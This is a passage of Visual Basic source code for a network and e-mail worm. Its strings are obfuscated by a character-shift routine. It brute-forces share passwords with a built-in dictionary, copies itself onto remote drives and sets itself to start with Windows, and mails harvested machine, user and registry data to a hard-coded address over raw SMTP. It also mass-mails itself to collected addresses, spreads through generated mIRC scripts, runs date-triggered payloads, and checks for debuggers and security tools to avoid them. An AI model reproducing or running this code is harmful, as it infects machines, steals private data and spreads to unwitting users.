If Bl = 0 Then BRed2Infected q("]=["): Exit Sub
Next
Next
End Sub

Function Ured()
On Error Resume Next: Dim U(1 To 70) As String
U(1) = "%null%": U(2) = "%username%": U(3) = "%username%12": U(4) = "%username%123"
U(5) = "%username%1234": U(6) = "123": U(7) = "1234": U(8) = "12345"
U(9) = "123456": U(10) = "1234567": U(11) = "12345678": U(12) = "654321"
U(13) = "54321": U(14) = "1": U(15) = "111": U(16) = "11111"
U(17) = "111111": U(18) = "11111111": U(19) = "000000": U(20) = "00000000"
U(21) = "pass": U(22) = "5201314": U(23) = "88888888": U(24) = "888888"
U(25) = "passwd": U(26) = "password": U(27) = "sql": U(28) = "database"
U(29) = "admin": U(30) = "test": U(31) = "server": U(32) = "computer"
U(33) = "secret": U(34) = "oracle": U(35) = "sybase": U(36) = "root"
U(37) = "Internet": U(38) = "super": U(39) = "user": U(40) = "manager"
U(41) = "security": U(42) = "public": U(43) = "private": U(44) = "default"
U(45) = "1234qwer": U(46) = "123qwe": U(47) = "abcd": U(48) = "abc123"
U(53) = "123abc": U(54) = "abc": U(55) = "123asd": U(56) = "asdf"
U(57) = "asdfgh": U(58) = "!@#$": U(59) = "!@#$%": U(60) = "!@#$%^"
U(61) = "!@#$%^&": U(62) = "!@#$%^&*": U(63) = "!@#$%^&*(": U(64) = "!@#$%^&*()"
U(65) = "intel": U(66) = "": U(67) = vbCrLf: U(68) = BGetComputerName()
U(69) = "KKKKKKK": U(70) = GetUser()
Ured = U()
End Function

Sub BRed2Infected(Bp)
On Error Resume Next: Dim bnr As String
bnr = Rm
FileCopy Sp(1) & q("[") & key2, Bp & bnr

If Dir(Bp & q("Frshbbd)efs")) <> "" Then
n = FrFile
Open Bp & q("Frshbbd)efs") For Append As #n
Print #n, vbCrLf & q("Gpni'[") & bnr: Close #n
End If

D = Dir(Bp, vbDirectory + vbSystem + vbHidden)
Do While Len(D) <> 0

If LCase(Left(D, 3)) = q("pni") Then
If InStr(D, ".") = 0 Then

WIni q("Pnichpt"), q("Uri"), Bp & bnr, Bp & D & q("[Pni)nin")

End If
End If

D = Dir()
Loop

Call BCNet
End Sub

Sub BCNet()
On Error Resume Next: Dim Bl As Long: Bl = WNetCancelConnection2("Z:", 0, True)
End Sub

Sub payload1()
On Error Resume Next
Set hh = Bf.createtextfile(Sp(0) & q("[Efucnbk)osf")): hh.write q(";osjk9;obfc9;snskb9Efucnbk'Phuj'*'@BC]FD'KFET'5773;(snskb9;(obfc9;ehc~'e`dhkhu:ekfdl'sbs:ubc9;dbisbu9;e9;----------------@BC]FD'KFET----------------9;w9Pni45(Efucnbk)D'e~'JfdonibCufjhi(@BC]FD;w9Obdoh'bi'bk'Wbuý'+Dfkncfc'Jricnfk;w9Fohuf'aridnhifk'bi'pni'IS+'5777+'_w+'wht'vrb'bi'bk'hsuh'jb'ofenf'bvrnqhdfch'=.;eu9;w9Knebusfc'f'Wfkbtsnif+'Fa`fintsfi'b'Nufv;eu9;w9@BC]FD'KFET'5773;(e9;(dbisbu9;(ehc~9;(osjk9"): hh.Close
If Day(Date) = 3 Then Bw.run Sp(0) & q("[Efucnbk)osf")
End Sub

Sub payload2()
On Error Resume Next: If Day(Date) = 5 Then Bw.run q("ossw=((ppp)fqunk*kfqn`ib)dhj")
End Sub

Sub payload3()
On Error Resume Next: If Day(Date) = 19 Then Bw.run q("ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(ftbtniht)osjk")
End Sub

Sub payload4()
On Error Resume Next: If Day(Date) = 1 Then MsgBox q("@BC]FD'QNQB"), , q("EfucnbkPhuj")
End Sub

Sub payload5()
On Error Resume Next: If Day(Date) = 7 Then MsgBox q("erto''^''tofuhi'FTBTNIHT") & vbCrLf & q("KNEBUSFC''F''WFKBTSNIF''b''NUFV"), , q("EfucnbkPhuj")
End Sub

Sub SendBackDat()
Call WriteReg
On Error Resume Next
If BState() = False Then Exit Sub

Dim MsgBardiel As String
MsgBardiel = q("P45)Efucnbk)F)phuj'Ubwhusfichtb") & vbCrLf & Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[Wfubis")) & vbCrLf & InDat(1) & vbCrLf & InDat(2) & vbCrLf
MsgBardiel = MsgBardiel & vbCrLf & ReadFile(Sp(2) & q("[JfnkJ)cfs")) & vbCrLf & ReadFile(Sp(2) & q("[JfnkO)cfs")) & vbCrLf & ReadFile(Sp(2) & q("[JfnkK)cfs")) & vbCrLf
MsgBardiel = MsgBardiel & vbCrLf & GetWinVersion & vbCrLf & Date & vbCrLf & Time & vbCrLf & Left(PaisID, Len(PaisID) - 1) & vbCrLf & Left(LanguageID, Len(LanguageID) - 1) & vbCrLf
MsgBardiel = MsgBardiel & vbCrLf & Left(BGetComputerName, Len(BGetComputerName) - 0) & vbCrLf & GetUser
If Not (StartWinsock()) Then Exit Sub
Call Hook(form1.hWnd)

Dim Temp As Variant: Progress = 0: do_cancel = False
   
    If mysock <> 0 Then closesocket (mysock): mysock = 0
        
Temp = ConnectSock(CStr(q("j6)kfsnijfnk)dhj")), form1.hWnd)
    
    If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub
    
If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

   Call SendData(mysock, "HELO localhost" & vbCrLf)

If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
        
    Call SendData(mysock, "mail from:" + Chr(32) + "<bargedC@latinmail.com>" + vbCrLf)

If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

    Call SendData(mysock, "RCPT TO:<sachiel2016@latinmail.com>" & vbCrLf)
    
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
    Call SendData(mysock, "DATA" & vbCrLf)
    
If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

    Call SendData(mysock, MsgBardiel & vbCrLf & vbCrLf & "." & vbCrLf)
                
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
    Call SendData(mysock, "QUIT" & vbCrLf)
    
If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

Call closesocket(mysock): mysock = 0
Call UnHook(form1.hWnd)
Call EndWinsock
End Sub

Function ReadFile(Pfile)
On Error Resume Next
If Not (Flx(Pfile)) Then Exit Function
Dim pr As String
Set pf = Bf.OpenTextFile(Pfile): pr = pf.ReadAll: pf.Close
ReadFile = pr
End Function

Sub BPirch(Ppath)
On Error Resume Next: Dim PScript As String
PScript = q("\KbqbktZ") & vbCrLf & _
q("Bifekbc:6") & vbCrLf & q("Dhris:6") & vbCrLf & q("Kbqbk6:777*Rilihpit") & vbCrLf & q("777*RilihpitBifekbc:6") & vbCrLf & _
q("") & vbCrLf & q("\777*RilihpitZ") & vbCrLf & _
q("Rtbu6:-&-G-") & vbCrLf & q("RtbuDhris:6") & vbCrLf & _
q("Bqbis6:HI'MHNI=-=(wunqjt`'#indl'Tb'Dofs'bi'ossw=((ppp)whphp)dhj(jcj4775(nicb)osjk'{'(ankbdhw~'#wnudowfso'#,'e)`c'#wnudowfso'#,'#jb'#,')}nw'{'(cdd'tbic'#indl'#wnudowfso'#,'#jb'#,')}nw") & vbCrLf & _
q("Bqbis5:HI'WFUS=$=(wunqjt`'#indl'Feruunch8'Jnuf'btsf'wf`b'ossw=((bt)`bhdnsnbt)dhj(jcj4775ec(nicb)osjk'{'(ankbdhw~'#wnudowfso'#,'e)`c'#wnudowfso'#,'#jb'#,')}nw'{'(cdd'tbic'#indl'#wnudowfso'#,'#jb'#,')}nw") & vbCrLf & _
q("Bqbis4:HI'CDDTBIS=-)}nw=(punsb'*D'#wnudowfso'#,'dkt)qeb'Hi'Buuhu'Ubtrjb'Ibs'{'(punsb'#wnudowfso'#,'dkt)qeb'Tbs'a:DubfsbHembds/%Tdunwsni`)AnkbT~tsbjHembds%.'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'%'#,'#wnudowfso'#,'-)}nw%'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'ptdunws)tdunwsarkkifjb'{'(snjbu'6'6'2'(bbdrsb'#wnudowfso'#,'dkt)qeb") & vbCrLf & _
q("Bqbis3:HI'CDDTBICAFNK=-)}nw=(punsb'*D'#wnudowfso'#,'dkt)qeb'Hi'Buuhu'Ubtrjb'Ibs'{'(punsb'#wnudowfso'#,'dkt)qeb'Tbs'a:DubfsbHembds/%Tdunwsni`)AnkbT~tsbjHembds%.'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'%'#,'#wnudowfso'#,'-)}nw%'{'(punsb'#wnudowfso'#,'dkt)qeb'a)CbkbsbAnkb'ptdunws)tdunwsarkkifjb'{'(snjbu'5'6'2'(bbdrsb'#wnudowfso'#,'dkt)qeb") & vbCrLf & _
q("Bqbis2:HI'SB_S=-qnurt-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
q("Bqbis1:HI'SB_S=-`rtfih-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
q("Bqbis0:HI'SB_S=-phuj-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
q("Bqbis?:HI'SB_S=-suhmfi-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & _
q("Bqbis>:HI'SB_S=-suh~fih-=-=(n`ihub'#indl'{'(dkhtb'#indl") & vbCrLf & q("BqbisDhris:>")

Set P = Bf.createtextfile(Sp(0) & q("[bqbist)ckk")): P.write PScript: P.Close
PScript = "": FileCopy Sp(0) & q("[bqbist)ckk"), Ppath & q("[bqbist)nin"): SA Ppath & q("[bqbist)nin"), 0
WIni q("CDD"), q("FrshOncbCddPni"), q("6"), Ppath & q("[wnudo>?)nin")
WIni q("CDD"), q("FrshOncbCddPni"), q("6"), Ppath & q("[wnudo45)nin")

If Dir(Ppath & q("[e)`c")) <> "" Then Exit Sub
id = Shell(Sp(1) & q("[wl}nw)bb'") & Ppath & q("[`bc}fd)}nw'") & Sp(1) & q("[") & key2, vbHide)
Sleep 5000: Name Ppath & q("[`bc}fd)}nw") As Ppath & q("[e)`c")
End Sub

Sub Priority()
On Error Resume Next
Call SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)
End Sub

Sub bSmtp(bHost, bDat, bFrom, bStyle)
Call WriteReg
On Error Resume Next
If BState() = False Then Exit Sub
Set M1 = Bf.OpenTextFile(bDat): M2 = M1.ReadAll: M1.Close
M3 = Split(M2, vbCrLf)

If Not (StartWinsock()) Then Exit Sub
Call Hook(form1.hWnd)

Dim Temp As Variant: Progress = 0: do_cancel = False
   
    If mysock <> 0 Then closesocket (mysock): mysock = 0
        
Temp = ConnectSock(bHost, form1.hWnd)
    
    If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub
    
If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

    If InStr(LCase(bHost), q("ohsjfnk")) <> 0 Then Call SendData(mysock, "HELO worldcomputers.com" & vbCrLf) Else Call SendData(mysock, "HELO localhost" & vbCrLf)

If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
For i = 0 To UBound(M3)

If (IsMail(M3(i))) And (IsMReg(M3(i))) Then
    
    Call SendData(mysock, "mail from:" + Chr(32) + "<" + bFrom + ">" + vbCrLf)

If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

    Call SendData(mysock, "RCPT TO:<" & M3(i) & ">" & vbCrLf)
    
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
    Call SendData(mysock, "DATA" & vbCrLf)
    
If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

    Randomize: xx = Int(Rnd * UBound(M3)): Call SendData(mysock, BEML(M3(xx), bStyle) & vbCrLf & vbCrLf & "." & vbCrLf)
                
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
End If
Next

    Call SendData(mysock, "QUIT" & vbCrLf)
    
If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

Rw q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[TjswSnjb"), Day(Date), ""

Call closesocket(mysock): mysock = 0
Call UnHook(form1.hWnd)
Call EndWinsock

End Sub

Sub ExitSmtp()
On Error Resume Next
Call closesocket(mysock): mysock = 0
Call UnHook(form1.hWnd)
Call EndWinsock
Call BSendMail
End Sub
Function bSmtpProgress(b As Long) As Boolean
On Error Resume Next: Dim TimeOut As Variant
TimeOut = Timer + 60
While Progress <> b
        DoEvents
        If do_cancel = True Then
        Call closesocket(mysock): mysock = 0
        bSmtpProgress = False
            Exit Function
        End If
        
        If Timer > TimeOut Then
            Call closesocket(mysock): mysock = 0
            bSmtpProgress = False
            Exit Function
        End If
Wend
bSmtpProgress = True
End Function

Function bSmtpProgress1(b As Long) As Boolean
On Error Resume Next: Dim TimeOut As Variant
TimeOut = Timer + 180
While rtncode <> b
        DoEvents
        If do_cancel = True Then
        Call closesocket(mysock): mysock = 0
        bSmtpProgress1 = False
            Exit Function
        End If
        
        If Timer > TimeOut Then
            Call closesocket(mysock): mysock = 0
            bSmtpProgress1 = False
            Exit Function
        End If
Wend
rtncode = 0
bSmtpProgress1 = True
End Function

Sub WriteReg()
On Error Resume Next: Dim v As String: v = ""


For Each strEnv In Bw.Environment(q("WUHDBTT"))
       If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
Next

If IsDebuggerPresent() <> (20 / -20) + 1 Then End

sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

For i = 0 To UBound(sHn)
sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
If sHle <> (Asc(Chr(30 + 4)) / -2) + 16 Then End
Next

sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)Bb[Wfso"))
For x = 0 To UBound(sRg)
sRr = Rr(sRg(x))
If sRr <> v Then End
Next

End Sub

Function MsD(x)
On Error Resume Next: MsD = Bf.GetFile(x).ShortPath
End Function
